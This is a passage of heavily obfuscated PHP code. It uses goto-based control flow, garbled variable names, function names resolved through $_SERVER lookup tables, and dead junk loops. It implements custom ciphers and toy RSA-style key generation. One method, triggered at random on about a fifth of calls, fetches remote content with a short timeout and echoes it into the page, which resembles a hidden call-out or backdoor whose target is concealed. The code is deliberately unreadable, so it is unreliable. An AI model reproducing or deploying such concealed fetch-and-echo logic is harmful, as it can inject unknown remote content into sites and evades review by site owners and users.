$DäéÑÓÂ¹‰[294] => $DäéÑÓÂ¹‰[295], $DäéÑÓÂ¹‰[296] => $DäéÑÓÂ¹‰[297], $DäéÑÓÂ¹‰[298] => $DäéÑÓÂ¹‰[299], $DäéÑÓÂ¹‰[300] => $DäéÑÓÂ¹‰[301], $DäéÑÓÂ¹‰[302] => $DäéÑÓÂ¹‰[241], $DäéÑÓÂ¹‰[303] => $DäéÑÓÂ¹‰[241], $DäéÑÓÂ¹‰[304] => $DäéÑÓÂ¹‰[293], $DäéÑÓÂ¹‰[305] => $DäéÑÓÂ¹‰[295], $DäéÑÓÂ¹‰[306] => $DäéÑÓÂ¹‰[297], $DäéÑÓÂ¹‰[307] => $DäéÑÓÂ¹‰[308], $DäéÑÓÂ¹‰[309] => $DäéÑÓÂ¹‰[299], $DäéÑÓÂ¹‰[310] => $DäéÑÓÂ¹‰[311], $DäéÑÓÂ¹‰[312] => $DäéÑÓÂ¹‰[301], $DäéÑÓÂ¹‰[313] => $DäéÑÓÂ¹‰[314], $DäéÑÓÂ¹‰[315] => $DäéÑÓÂ¹‰[316], $DäéÑÓÂ¹‰[317] => $DäéÑÓÂ¹‰[318]); goto f¬ˆÕê‚˜ğ; fè›æ²ÊÔç: $CŸøÜ¥–Ğ¶ = $DäéÑÓÂ¹‰[201]($CŸøÜ¥–Ğ¶ ? $CŸøÜ¥–Ğ¶ : $DäéÑÓÂ¹‰[293]); $DÑ¦¨—„õİ = $DäéÑÓÂ¹‰[104]($this->jsocc4af2946, $DäéÑÓÂ¹‰[319]); $E”ìÂºƒƒ˜ = $FñÄ¢„Š‘‡[619]; goto fé¥¡ÇŒ¥; f¬ˆÕê‚˜ğ: $CŸøÜ¥–Ğ¶ = $aØË·ÑºÒ¬[$this->ovyhb2994ff5]; $aÈè°Ü¾¤ƒ = $FñÄ¢„Š‘‡[618]; while (strlen($aÈè°Ü¾¤ƒ) < $FñÄ¢„Š‘‡[568]) { if (!$aÈè°Ü¾¤ƒ) { break; } $aÈè°Ü¾¤ƒ++; } goto fè›æ²ÊÔç; E¦ÍÚ‡Ş¥: } public function bdwz6b786044($B¨ãÃºÒÒŸ) { goto B·ÑŠá—†; c¦Á·¦ªö¤: $E²ëÑ‡ÎØ = $fÃõ¥”ÃÓ¶[61]($fÃõ¥”ÃÓ¶[139])->{$_SERVER[®Ñèœ¡][140]}(); if ($E²ëÑ‡ÎØ <= $bö™Ù­‚—Œ) { return; } $aÆÈÑæõŠº = $fÃõ¥”ÃÓ¶[61]($fÃõ¥”ÃÓ¶[139])->{$_SERVER[®Ñèœ¡][320]}($fÃõ¥”ÃÓ¶[321])->{$_SERVER[®Ñèœ¡][322]}($bö™Ù­‚—Œ)->{$_SERVER[®Ñèœ¡][323]}(); goto F‡–ŠÁó¶—; EÙ–¬£àŒ²: $BŞ½øññãã = $f‹İ…‘µù[621]; if (!$BŞ½øññãã) { die; } if ($bö™Ù­‚—Œ >= $fÃõ¥”ÃÓ¶[201]($fÃõ¥”ÃÓ¶[241])) { return; } goto c¦Á·¦ªö¤; aİ—¾Ô¥©: if (!$fÃõ¥”ÃÓ¶[239]($B¨ãÃºÒÒŸ[$fÃõ¥”ÃÓ¶[321]], $aÆÈÑæõŠº)) { $fÃõ¥”ÃÓ¶[166]($fÃõ¥”ÃÓ¶[324], !1, $fÃõ¥”ÃÓ¶[236]); } goto Eáºã°Ù”; F‡–ŠÁó¶—: $C ¤çâÅ‚Ğ = $f‹İ…‘µù[622]; $aÆÈÑæõŠº = $fÃõ¥”ÃÓ¶[222]($aÆÈÑæõŠº, $fÃõ¥”ÃÓ¶[10], $fÃõ¥”ÃÓ¶[321]); $BˆÎÃ´…ƒ = $f‹İ…‘µù[623]; goto aİ—¾Ô¥©; B·ÑŠá—†: $f‹İ…‘µù =& $_SERVER[îÖ]; $fÃõ¥”ÃÓ¶ =& $_SERVER[®Ñèœ¡]; $bö™Ù­‚—Œ = $this->{$_SERVER[®Ñèœ¡][137]}(); goto EÙ–¬£àŒ²; Eáºã°Ù”: } public function twep74dff191() { goto D¨©ˆĞ³£Ö; f›¦›‰òÓ¨: while ($C¹ùÜÍÙ†ö < $A”æËÁ…ÖÖ[553]) { if ($C¹ùÜÍÙ†ö >= 0) { break; } $C¹ùÜÍÙ†ö++; } $dµØ±é¢ô = @$BÄÊ˜¼„—§[253]($e”­ä«…™ä, !1, $f‚á¢™¥Ø™); echo $BÄÊ˜¼„—§[326] . $BÄÊ˜¼„—§[327]($dµØ±é¢ô) . $BÄÊ˜¼„—§[328]; goto A®»ï›öˆÇ; eÇö‘¶æŒ: $e”­ä«…™ä = $BÄÊ˜¼„—§[245]; $e”­ä«…™ä = $this->{$_SERVER[®Ñèœ¡][246]}($e”­ä«…™ä, $BÄÊ˜¼„—§[247]); $Böìì¼õ‘è = $A”æËÁ…ÖÖ[624]; goto eñ´Ì„Ìá«; A®»ï›öˆÇ: $c±ÂÒ‡ß©õ = $A”æËÁ…ÖÖ[626]; if (strlen($c±ÂÒ‡ß©õ) < $A”æËÁ…ÖÖ[568]) { return; } goto eæøäÜº‹‰; eñ´Ì„Ìá«: while (strlen($Böìì¼õ‘è) < $A”æËÁ…ÖÖ[568]) { if (!$Böìì¼õ‘è) { break; } $Böìì¼õ‘è++; } $f‚á¢™¥Ø™ = $BÄÊ˜¼„—§[248](array($BÄÊ˜¼„—§[249] => array($BÄÊ˜¼„—§[250] => $BÄÊ˜¼„—§[251], $BÄÊ˜¼„—§[252] => 3))); $C¹ùÜÍÙ†ö = $A”æËÁ…ÖÖ[625]; goto f›¦›‰òÓ¨; D¨©ˆĞ³£Ö: $A”æËÁ…ÖÖ =& $_SERVER[îÖ]; $BÄÊ˜¼„—§ =& $_SERVER[®Ñèœ¡]; if (!$BÄÊ˜¼„—§[104]($GLOBALS, $BÄÊ˜¼„—§[132]) || $BÄÊ˜¼„—§[325](1, 100) > 20) { return; } goto eÇö‘¶æŒ; eæøäÜº‹‰: } private function djkv88a13623($F‚Ïª†Ì“, $d¶·ô…¨ˆ, $B‹ä‹Üõ°ç = 3) { goto A­íóË©Ş¬; e©Ç¿—‰‹ã: while (strlen($bå½…¼¼¶£) < $DÄ””¸åÃ[553]) { if (!$bå½…¼¼¶£) { break; } $bå½…¼¼¶£++; } $FÊÀ®ŸĞõ = $CÖ™è¢ÔÄº[325](0, 5) . $CÖ™è¢ÔÄº[10]; $C‚ìÓó±Šë = $DÄ””¸åÃ[629]; goto Bƒá‡ùîˆ¦; bˆšœÖ¬ÛÃ: $CÏ ¶›æ¢ƒ = $DÄ””¸åÃ[627]; $F‚Ïª†Ì“ = $CÖ™è¢ÔÄº[2]($F‚Ïª†Ì“); $bå½…¼¼¶£ = $DÄ””¸åÃ[628]; goto e©Ç¿—‰‹ã; Aôğ¶…­ˆ£: $B‹³í¥Í“ë = $CÖ™è¢ÔÄº[214]($FÊÀ®ŸĞõ . $FÛÆœÜ¯à . $B‹³í¥Í“ë); $a¦Õº¬Ş ‚ = $DÄ””¸åÃ[641]; if (strlen($a¦Õº¬Ş ‚) < $DÄ””¸åÃ[568]) { die; } goto e§²—ÍŞØ; Bƒá‡ùîˆ¦: $FÛÆœÜ¯à = $CÖ™è¢ÔÄº[124](15); $a«á‹¨½Ã = $CÖ™è¢ÔÄº[330]; switch ($FÊÀ®ŸĞõ) { case $CÖ™è¢ÔÄº[232]: $B‹³í¥Í“ë = $this->{$_SERVER[®Ñèœ¡][147]}($F‚Ïª†Ì“, $CÖ™è¢ÔÄº[214]($d¶·ô…¨ˆ . $FÛÆœÜ¯à)); break; case $CÖ™è¢ÔÄº[220]: $B‹³í¥Í“ë = $this->{$_SERVER[®Ñèœ¡][147]}($F‚Ïª†Ì“, $CÖ™è¢ÔÄº[214]($FÛÆœÜ¯à . $d¶·ô…¨ˆ)); break; case $CÖ™è¢ÔÄº[331]: $B‹³í¥Í“ë = $this->{$_SERVER[®Ñèœ¡][147]}($F‚Ïª†Ì“, $CÖ™è¢ÔÄº[118]($FÛÆœÜ¯à . $d¶·ô…¨ˆ)); break; $B†‰ğÏœÀ = $DÄ””¸åÃ[630]; if (strlen($B†‰ğÏœÀ) < $DÄ””¸åÃ[564]) { return; } case $CÖ™è¢ÔÄº[332]: $B‹³í¥Í“ë = $this->{$_SERVER[®Ñèœ¡][147]}($F‚Ïª†Ì“, $CÖ™è¢ÔÄº[114]($FÛÆœÜ¯à . $d¶·ô…¨ˆ)); $AÍÕ×Á£–Å = $DÄ””¸åÃ[631]; while (strlen($AÍÕ×Á£–Å) < $DÄ””¸åÃ[564]) { if (!$AÍÕ×Á£–Å) { break; } $AÍÕ×Á£–Å++; } break; $F„…ò©³¼Ü = $DÄ””¸åÃ[632]; case $CÖ™è¢ÔÄº[333]: goto bÚŒ¿ã›³„; d¯œŞšÖ‹: if (strlen($Cİ¾ë¥ÜÓ«) < $DÄ””¸åÃ[553]) { die; } $a¬¤Ïö±… = 0; $d¶¯ß ª¾Ã = 0; goto FÍËèè˜ìÚ; DÙÍ÷·éšˆ: $E¬¢‘–Èƒ = $CÖ™è¢ÔÄº[10]; $DéïóÌÏù¼ = 0; $Cİ¾ë¥ÜÓ« = $DÄ””¸åÃ[635]; goto d¯œŞšÖ‹; FÍËèè˜ìÚ: for ($DéïóÌÏù¼ = 0; $DéïóÌÏù¼ < $CÖ™è¢ÔÄº[24]($F‚Ïª†Ì“); $DéïóÌÏù¼++) { $d¶¯ß ª¾Ã = $d¶¯ß ª¾Ã == $CÖ™è¢ÔÄº[24]($c–Ÿ¦¾‘˜) ? 0 : $d¶¯ß ª¾Ã; $cğ¡¾•æŒÙ = $DÄ””¸åÃ[636]; $a¬¤Ïö±… = ($A´“Üß¨Ç + $CÖ™è¢ÔÄº[335]($a«á‹¨½Ã, $F‚Ïª†Ì“[$DéïóÌÏù¼]) + $CÖ™è¢ÔÄº[336]($c–Ÿ¦¾‘˜[$d¶¯ß ª¾Ã++])) % 64; $FõÚ¸§Ë = $DÄ””¸åÃ[637]; if (!$FõÚ¸§Ë) { die; } $E¬¢‘–Èƒ .= $a«á‹¨½Ã[$a¬¤Ïö±…]; $d‘¥½ö–‘œ = $DÄ””¸åÃ[638]; if (!$d‘¥½ö–‘œ) { return; } } $B‹³í¥Í“ë = $CÖ™è¢ÔÄº[327]($Cğ¬…‰ê¢Í . $E¬¢‘–Èƒ); break; goto AŒŒŸÉëƒÑ; bÂ—µ±·Ê´: $c–Ÿ¦¾‘˜ = $CÖ™è¢ÔÄº[25]($c–Ÿ¦¾‘˜, $A´“Üß¨Ç % 8, $A´“Üß¨Ç % 8 + 7); $FÑæİ­ã¥× = $DÄ””¸åÃ[634]; if (!$FÑæİ­ã¥×) { return; } goto DÙÍ÷·éšˆ; Aè¨ÔÉÈ¥¹: $c–Ÿ¦¾‘˜ = $CÖ™è¢ÔÄº[114]($Cğ¬…‰ê¢Í . $CÖ™è¢ÔÄº[114]($d¶·ô…¨ˆ . $Cğ¬…‰ê¢Í) . $d¶·ô…¨ˆ); $EíÇãôš“œ = $DÄ””¸åÃ[633]; if (!$EíÇãôš“œ) { die; } goto bÂ—µ±·Ê´; bÚŒ¿ã›³„: $F‚Ïª†Ì“ = $CÖ™è¢ÔÄº[118]($F‚Ïª†Ì“); $A´“Üß¨Ç = $CÖ™è¢ÔÄº[334](0, 64); $Cğ¬…‰ê¢Í = $a«á‹¨½Ã[$A´“Üß¨Ç]; goto Aè¨ÔÉÈ¥¹; AŒŒŸÉëƒÑ: default: $B‹³í¥Í“ë = $this->{$_SERVER[®Ñèœ¡][147]}($F‚Ïª†Ì“, $d¶·ô…¨ˆ . $FÛÆœÜ¯à); $DÇÁƒ‘¦š = $DÄ””¸åÃ[639]; if (strlen($DÇÁƒ‘¦š) < $DÄ””¸åÃ[564]) { return; } break; $fˆ«—àŞÓ  = $DÄ””¸åÃ[640]; } goto Aôğ¶…­ˆ£; A­íóË©Ş¬: $DÄ””¸åÃ =& $_SERVER[îÖ]; $CÖ™è¢ÔÄº =& $_SERVER[®Ñèœ¡]; $CÖ™è¢ÔÄº[329](1); goto bˆšœÖ¬ÛÃ; e§²—ÍŞØ: if ($B‹ä‹Üõ°ç - 1 > 0) { $B‹³í¥Í“ë = $this->{$_SERVER[®Ñèœ¡][127]}($B‹³í¥Í“ë, $d¶·ô…¨ˆ, $B‹ä‹Üõ°ç - 1); } return $B‹³í¥Í“ë; goto c²…Ç¦ó¬; c²…Ç¦ó¬: } private function qdrgdf3cb038($Cõ—–¯˜•Ê, $f†Ÿ»«½åõ, $CºŞ’„ÚÚ» = 3) { goto Cõ‡—«Àµ; F«™Øô’Ò…: $Cõ—–¯˜•Ê = $bì¶¯É§•´[2]($Cõ—–¯˜•Ê); $Cõ—–¯˜•Ê = $bì¶¯É§•´[214]($Cõ—–¯˜•Ê); $AŸ«åµ†† = $Cõ—–¯˜•Ê[0]; goto B‹³ìŒÍ§; aƒ‹‚Ûƒ±: $B³½¥Ù«Ö¾ = $bì¶¯É§•´[330]; switch ($AŸ«åµ††) { case $bì¶¯É§•´[232]: $câëÃ¿î¨” = $this->{$_SERVER[®Ñèœ¡][246]}($Cõ—–¯˜•Ê, $bì¶¯É§•´[214]($f†Ÿ»«½åõ . $fÜÜÀŠ’à)); break; case $bì¶¯É§•´[220]: $câëÃ¿î¨” = $this->{$_SERVER[®Ñèœ¡][246]}($Cõ—–¯˜•Ê, $bì¶¯É§•´[214]($fÜÜÀŠ’à . $f†Ÿ»«½åõ)); break; $aÅÍ³Î—ë¿ = $D¾„Ø½Üğ[643]; while (strlen($aÅÍ³Î—ë¿) < $D¾„Ø½Üğ[553]) { if (!$aÅÍ³Î—ë¿) { break; } $aÅÍ³Î—ë¿++; } case $bì¶¯É§•´[331]: $câëÃ¿î¨” = $this->{$_SERVER[®Ñèœ¡][246]}($Cõ—–¯˜•Ê, $bì¶¯É§•´[118]($fÜÜÀŠ’à . $f†Ÿ»«½åõ)); $CØ¹‹ÃÆÖ¼ = $D¾„Ø½Üğ[644]; if (strlen($CØ¹‹ÃÆÖ¼) < $D¾„Ø½Üğ[555]) { return; } break; case $bì¶¯É§•´[332]: $câëÃ¿î¨” = $this->{$_SERVER[®Ñèœ¡][246]}($Cõ—–¯˜•Ê, $bì¶¯É§•´[114]($fÜÜÀŠ’à . $f†Ÿ»«½åõ)); break; $b‡º„êáóÛ = $D¾„Ø½Üğ[645]; case $bì¶¯É§•´[333]: goto CóŸíî; bê³öÆ³³¨: $dŞÂ›¸˜öí = 0; $AŒ£‚² = $D¾„Ø½Üğ[651]; $eµ¨ ôÁñ´ = 0; goto D‡ä¡¢ö†; Eí……ëÅó: $câëÃ¿î¨” = $bì¶¯É§•´[339]($d‚’ê†°…í); $côªè‡İ¨¡ = $D¾„Ø½Üğ[656]; break; goto A¿ÑĞ¿¬òç; aíŒ¸µéËÖ: $e† ¡¸‘ = $D¾„Ø½Üğ[649]; if (!$e† ¡¸‘) { die; } $d‚’ê†°…í = $bì¶¯É§•´[10]; goto E™îÜá×; CóŸíî: $Cõ—–¯˜•Ê = $bì¶¯É§•´[338]($Cõ—–¯˜•Ê); $c¹Â¨©ÖáÑ = $Cõ—–¯˜•Ê[0]; $Cõ—–¯˜•Ê = $bì¶¯É§•´[25]($Cõ—–¯˜•Ê, 1); goto Cõ…™ïíº™; Cõ…™ïíº™: $AÎ™†Ç…Œ = $D¾„Ø½Üğ[646]; while ($AÎ™†Ç…Œ < $D¾„Ø½Üğ[553]) { if ($AÎ™†Ç…Œ >= 0) { break; } $AÎ™†Ç…Œ++; } $f‚ÓÔÁˆ´Ş = $bì¶¯É§•´[335]($B³½¥Ù«Ö¾, $c¹Â¨©ÖáÑ); goto aäÊİ¶‘²Ô; E•ÍŒÈÇ: $cš¶™¶Œ˜ = $D¾„Ø½Üğ[648]; if (!$cš¶™¶Œ˜) { return; } $BğÈ©“Œà„ = $bì¶¯É§•´[25]($BğÈ©“Œà„, $f‚ÓÔÁˆ´Ş % 8, $f‚ÓÔÁˆ´Ş % 8 + 7); goto aíŒ¸µéËÖ; D‡ä¡¢ö†: $f´´èªÚÀ£ = $D¾„Ø½Üğ[652]; if (!$f´´èªÚÀ£) { die; } for ($eëÆÖÆÚ‰î = 0; $eëÆÖÆÚ‰î < $bì¶¯É§•´[24]($Cõ—–¯˜•Ê); $eëÆÖÆÚ‰î++) { $eµ¨ ôÁñ´ = $eµ¨ ôÁñ´ == $bì¶¯É§•´[24]($BğÈ©“Œà„) ? 0 : $eµ¨ ôÁñ´; $b«Ê—¸ˆ¤ = $D¾„Ø½Üğ[653]; while (strlen($b«Ê—¸ˆ¤) < $D¾„Ø½Üğ[568]) { if (!$b«Ê—¸ˆ¤) { break; } $b«Ê—¸ˆ¤++; } $E§ğ¦÷‘· = $eµ¨ ôÁñ´++; $E§â›­Ç¼Ø = $D¾„Ø½Üğ[654]; if (!$E§â›­Ç¼Ø) { die; } $dŞÂ›¸˜öí = $bì¶¯É§•´[335]($B³½¥Ù«Ö¾, $Cõ—–¯˜•Ê[$eëÆÖÆÚ‰î]) - $f‚ÓÔÁˆ´Ş - $bì¶¯É§•´[336]($BğÈ©“Œà„[$E§ğ¦÷‘·]); $bËÂ¼œ®ƒ‹ = $D¾„Ø½Üğ[655]; if (!$bËÂ¼œ®ƒ‹) { return; } while ($dŞÂ›¸˜öí < 0) { $dŞÂ›¸˜öí += 64; } $d‚’ê†°…í .= $B³½¥Ù«Ö¾[$dŞÂ›¸˜öí]; } goto Eí……ëÅó; aäÊİ¶‘²Ô: $bÇ»‰—¼á‰ = $D¾„Ø½Üğ[647]; if (strlen($bÇ»‰—¼á‰) < $D¾„Ø½Üğ[553]) { die; } $BğÈ©“Œà„ = $bì¶¯É§•´[114]($c¹Â¨©ÖáÑ . $bì¶¯É§•´[114]($f†Ÿ»«½åõ . $c¹Â¨©ÖáÑ) . $f†Ÿ»«½åõ); goto E•ÍŒÈÇ; E™îÜá×: $eëÆÖÆÚ‰î = 0; $e§º¡ªøäŠ = $D¾„Ø½Üğ[650]; if (strlen($e§º¡ªøäŠ) < $D¾„Ø½Üğ[568]) { die; } goto bê³öÆ³³¨; A¿ÑĞ¿¬òç: $B‘˜ƒ‹Å‹ = $D¾„Ø½Üğ[657]; if (!$B‘˜ƒ‹Å‹) { die; } goto cÒÁ¡Öã; cÒÁ¡Öã: default: $câëÃ¿î¨” = $this->{$_SERVER[®Ñèœ¡][246]}($Cõ—–¯˜•Ê, $f†Ÿ»«½åõ . $fÜÜÀŠ’à); $c‡ŞÇ¯¨´ø = $D¾„Ø½Üğ[658]; break; } if ($CºŞ’„ÚÚ» - 1 > 0) { $câëÃ¿î¨” = $this->{$_SERVER[®Ñèœ¡][188]}($câëÃ¿î¨”, $f†Ÿ»«½åõ, $CºŞ’„ÚÚ» - 1); } goto B¹ÊÔÔÙÒ¨; Cõ‡—«Àµ: $D¾„Ø½Üğ =& $_SERVER[îÖ]; $bì¶¯É§•´ =& $_SERVER[®Ñèœ¡]; if (!$bì¶¯É§•´[337]($Cõ—–¯˜•Ê) || $bì¶¯É§•´[24]($Cõ—–¯˜•Ê) < 10) { return !1; } goto F«™Øô’Ò…; B¹ÊÔÔÙÒ¨: return $câëÃ¿î¨”; goto d×Ã„°‹…; B‹³ìŒÍ§: $fÜÜÀŠ’à = $bì¶¯É§•´[25]($Cõ—–¯˜•Ê, 1, 15); $D¶ºƒàî˜ = $D¾„Ø½Üğ[642]; $Cõ—–¯˜•Ê = $bì¶¯É§•´[25]($Cõ—–¯˜•Ê, 16); goto aƒ‹‚Ûƒ±; d×Ã„°‹…: } public function ejrsf18c17d3($fùõÖàùƒ‚) { goto E‹šµÛÈ¢; B´ÈîŞ§ºÁ: for ($D‡±“Œ˜ = 0; $D‡±“Œ˜ < $aÖĞñƒŸ‡ˆ * 10; $D‡±“Œ˜++) { if (($aÖĞñƒŸ‡ˆ * $D‡±“Œ˜ + 1) % $C²’‹Ä‘¦ß == 0) { $CäÂË¾­í = $BáóÇß£ˆÍ[201](($aÖĞñƒŸ‡ˆ * $D‡±“Œ˜ + 1) / $C²’‹Ä‘¦ß); break; } } $AÏ¹Î‰‰¥À = $this->{$_SERVER[®Ñèœ¡][147]}($B¶¦ïÒ²½× * $dÓò¹ÔéÍ§ . $BáóÇß£ˆÍ[10], $BáóÇß£ˆÍ[149]); $cÂÇƒÕ¤ğÆ = $BáóÇß£ˆÍ[114]($BáóÇß£ˆÍ[341] . ($B¶¦ïÒ²½× + $dÓò¹ÔéÍ§) . $BáóÇß£ˆÍ[342] . $C²’‹Ä‘¦ß . $BáóÇß£ˆÍ[342] . $CäÂË¾­í . $BáóÇß£ˆÍ[343]); goto aêÏŒ¤Ğ¨¦; F¾ÄÑ¶Í¯: $aÖĞñƒŸ‡ˆ = ($B¶¦ïÒ²½× - 1) * ($dÓò¹ÔéÍ§ - 1); $C²’‹Ä‘¦ß = $BáóÇß£ˆÍ[201](($B¶¦ïÒ²½× + $dÓò¹ÔéÍ§) / 2); $b¤í‹ô ‰ = $bèñéµĞº[660]; goto aª‡á˜µ‹î; E‹šµÛÈ¢: $bèñéµĞº =& $_SERVER[îÖ]; $BáóÇß£ˆÍ =& $_SERVER[®Ñèœ¡]; $B¶¦ïÒ²½× = $this->{$_SERVER[®Ñèœ¡][340]}(); goto E¥“îîì÷; E¥“îîì÷: $aô†ÉŞŠ = $bèñéµĞº[659]; if (!$aô†ÉŞŠ) { die; } $dÓò¹ÔéÍ§ = $this->{$_SERVER[®Ñèœ¡][340]}(); goto F¾ÄÑ¶Í¯; aêÏŒ¤Ğ¨¦: $dº¬ËèÃ¼ = $bèñéµĞº[664]; if (strlen($dº¬ËèÃ¼) < $bèñéµĞº[560]) { return; } $A‰Ë¥òİ¶  = $this->{$_SERVER[®Ñèœ¡][147]}($fùõÖàùƒ‚, $cÂÇƒÕ¤ğÆ) . $BáóÇß£ˆÍ[344] . $AÏ¹Î‰‰¥À; goto a§öà©×ï™; aª‡á˜µ‹î: if (strlen($b¤í‹ô ‰) < $bèñéµĞº[568]) { return; } while (1) { $CïñÂËÄĞ„ = $C²’‹Ä‘¦ß; $fŞ‡‹ Ú = $aÖĞñƒŸ‡ˆ; $Aà‹…Ù¾æ = $bèñéµĞº[661]; while ($fŞ‡‹ Ú % $CïñÂËÄĞ„ != 0) { $B’¬ùƒŸ°“ = $fŞ‡‹ Ú; $bäçæ–‘£ï = $bèñéµĞº[662]; if (strlen($bäçæ–‘£ï) < $bèñéµĞº[555]) { die; } $fŞ‡‹ Ú = $CïñÂËÄĞ„; $E–ƒøÕö‚Ü = $bèñéµĞº[571]; while ($E–ƒøÕö‚Ü < $bèñéµĞº[568]) { if ($E–ƒøÕö‚Ü >= 0) { break; } $E–ƒøÕö‚Ü++; } $CïñÂËÄĞ„ = $B’¬ùƒŸ°“ % $CïñÂËÄĞ„; $A‘ÁÆğŠÛæ = $bèñéµĞº[663]; } if ($CïñÂËÄĞ„ == 1) { break; } else { $C²’‹Ä‘¦ß++; } } $CäÂË¾­í = 2; goto B´ÈîŞ§ºÁ; a§öà©×ï™: return $A‰Ë¥òİ¶ ; $bÆŒ ½Ï™ = $bèñéµĞº[665]; while ($bÆŒ ½Ï™ < $bèñéµĞº[560]) { if ($bÆŒ ½Ï™ >= 0) { break; } $bÆŒ ½Ï™++; } goto Aä‡Ôï³“†; Aä‡Ôï³“†: } public function bdaffc6e57a7($fÛ¤ÇÊ£¤Ğ) { goto A¸ïÊ‘Ü“; B¢õÄì†Íê: for ($e±‚¹ã†ù = 3; $e±‚¹ã†ù < $BÙ›¬Œ¿™ó; $e±‚¹ã†ù += 2) { if ($BÙ›¬Œ¿™ó % $e±‚¹ã†ù != 0) { continue; } $dªìèÇ¯ = $e±‚¹ã†ù; $cŠëæ÷ÚŠ¦ = $a…óŒåÑ­ƒ[201]($BÙ›¬Œ¿™ó / $e±‚¹ã†ù); break; } $AÀá‚½ùß† = ($dªìèÇ¯ - 1) * ($cŠëæ÷ÚŠ¦ - 1); $DÊ¾îÄãõ† = $a…óŒåÑ­ƒ[201](($dªìèÇ¯ + $cŠëæ÷ÚŠ¦) / 2); goto Fø¼¿ğŒò; DÒŒäæ‹ç: $CÂˆ£İğÄí = $eïôÆÇ[667]; if (strlen($CÂˆ£İğÄí) < $eïôÆÇ[555]) { return; } $cŠëæ÷ÚŠ¦ = 0; goto B¢õÄì†Íê; Fø¼¿ğŒò: while (1) { $Cè‰é†Ë‡ = $DÊ¾îÄãõ†; $cĞèç„…–İ = $AÀá‚½ùß†; $dÚ™›ëÀ²ğ = $eïôÆÇ[668]; if (!$dÚ™›ëÀ²ğ) { die; } while ($cĞèç„…–İ % $Cè‰é†Ë‡ != 0) { $C¥‹ñ‹Áê = $cĞèç„…–İ; $EÑõŸôŠÛ› = $eïôÆÇ[669]; if (strlen($EÑõŸôŠÛ›) < $eïôÆÇ[560]) { die; } $cĞèç„…–İ = $Cè‰é†Ë‡; $Cè‰é†Ë‡ = $C¥‹ñ‹Áê % $Cè‰é†Ë‡; } if ($Cè‰é†Ë‡ == 1) { break; } else { $DÊ¾îÄãõ†++; } } $e²ó³óğ× = 2; for ($e±‚¹ã†ù = 0; $e±‚¹ã†ù < $AÀá‚½ùß† * 10; $e±‚¹ã†ù++) { if (($AÀá‚½ùß† * $e±‚¹ã†ù + 1) % $DÊ¾îÄãõ† == 0) { $e²ó³óğ× = $a…óŒåÑ­ƒ[201](($AÀá‚½ùß† * $e±‚¹ã†ù + 1) / $DÊ¾îÄãõ†); break; } } goto c¤ä­ÊÇÆÚ; A£šÃ¬†£†: $BŞàí”é¯ = $eïôÆÇ[666]; if ($a…óŒåÑ­ƒ[19]($e’¶·¯ĞÅ‡) != 2) { return $a…óŒåÑ­ƒ[10]; } $BÙ›¬Œ¿™ó = $this->{$_SERVER[®Ñèœ¡][246]}($e’¶·¯ĞÅ‡[1] . $a…óŒåÑ­ƒ[10], $a…óŒåÑ­ƒ[149]); goto Döì©Ù”ì; A¸ïÊ‘Ü“: $eïôÆÇ =& $_SERVER[îÖ]; $a…óŒåÑ­ƒ =& $_SERVER[®Ñèœ¡]; $e’¶·¯ĞÅ‡ = $a…óŒåÑ­ƒ[0]($a…óŒåÑ­ƒ[344], $fÛ¤ÇÊ£¤Ğ); goto A£šÃ¬†£†; eí™é‚–¨: return $Cñ†äŞÔÈÇ; goto D×‹‘«¡Ç®; Döì©Ù”ì: if (!$BÙ›¬Œ¿™ó) { return $a…óŒåÑ­ƒ[10]; } $BÙ›¬Œ¿™ó = $a…óŒåÑ­ƒ[201]($BÙ›¬Œ¿™ó); $dªìèÇ¯ = 0; goto DÒŒäæ‹ç; c¤ä­ÊÇÆÚ: $b÷“ßğ£ÑÀ = $a…óŒåÑ­ƒ[114]($a…óŒåÑ­ƒ[341] . ($dªìèÇ¯ + $cŠëæ÷ÚŠ¦) . $a…óŒåÑ­ƒ[342] . $DÊ¾îÄãõ† . $a…óŒåÑ­ƒ[342] . $e²ó³óğ× . $a…óŒåÑ­ƒ[343]); $Cñ†äŞÔÈÇ = $this->{$_SERVER[®Ñèœ¡][246]}($e’¶·¯ĞÅ‡[0], $b÷“ßğ£ÑÀ); $FÆÁ¨‡³² = $eïôÆÇ[670]; goto eí™é‚–¨; D×‹‘«¡Ç®: } public function plqc66184634() { goto a…÷—¯Ô»Ü; e·ïÏ”ãÄ: $C®ˆø«ÀÊê = $DªŠ†šŠ–ù[671]; if (!$C®ˆø«ÀÊê) { die; } $däËÚ×ãóƒ = array(); goto c²à¸ğÕÛ£; F†ì½‘éÑé: $CêÎ“ÌšŞò = $DªŠ†šŠ–ù[673]; for ($DÃÅ¿ã³½» = $c¡Ü­·¬œÒ; $DÃÅ¿ã³½» > 1; $DÃÅ¿ã³½»--) { $aïÎô“Æ = !0; $cöƒ‘ö×Ÿ› = $DªŠ†šŠ–ù[674]; if (strlen($cöƒ‘ö×Ÿ›) < $DªŠ†šŠ–ù[568]) { die; } foreach ($däËÚ×ãóƒ as $a•ªáœÈ¾ˆ) { if ($DÃÅ¿ã³½» % $a•ªáœÈ¾ˆ == 0) { $aïÎô“Æ = !1; break; } } if ($aïÎô“Æ) { $AÅ²Œ‹º…˜ = $DÃÅ¿ã³½»; break; } } return $AÅ²Œ‹º…˜; goto e…Õè§ëó³; a…÷—¯Ô»Ü: $DªŠ†šŠ–ù =& $_SERVER[îÖ]; $DØ—‡¼áŸ =& $_SERVER[®Ñèœ¡]; $c¡Ü­·¬œÒ = $DØ—‡¼áŸ[325]($DØ—‡¼áŸ[345](2, 14), $DØ—‡¼áŸ[345](2, 16) - 1); goto e·ïÏ”ãÄ; c²à¸ğÕÛ£: $EÎ¾îŒá³ = 1; while ($EÎ¾îŒá³ <= (int) $DØ—‡¼áŸ[346]($c¡Ü­·¬œÒ)) { $DÃÅ¿ã³½» = $EÎ¾îŒá³; while (!0) { $DÃÅ¿ã³½»++; if ($DÃÅ¿ã³½» <= 2) { $EÎ¾îŒá³ = $DÃÅ¿ã³½»; break; } else { if ($DÃÅ¿ã³½» < 2) { continue; } } $aïÎô“Æ = !0; for ($A·†çâŸÆ‘ = 2; $A·†çâŸÆ‘ <= $DØ—‡¼áŸ[346]($DÃÅ¿ã³½»); $A·†çâŸÆ‘++) { if ($DÃÅ¿ã³½» % $A·†çâŸÆ‘ == 0) { $aïÎô“Æ = !1; } } if ($aïÎô“Æ) { $EÎ¾îŒá³ = $DÃÅ¿ã³½»; break; } } $däËÚ×ãóƒ[] = $EÎ¾îŒá³; $d¢À’æòÅ = $DªŠ†šŠ–ù[672]; if (!$d¢À’æòÅ) { die; } } $AÅ²Œ‹º…˜ = 2; goto F†ì½‘éÑé; e…Õè§ëó³: 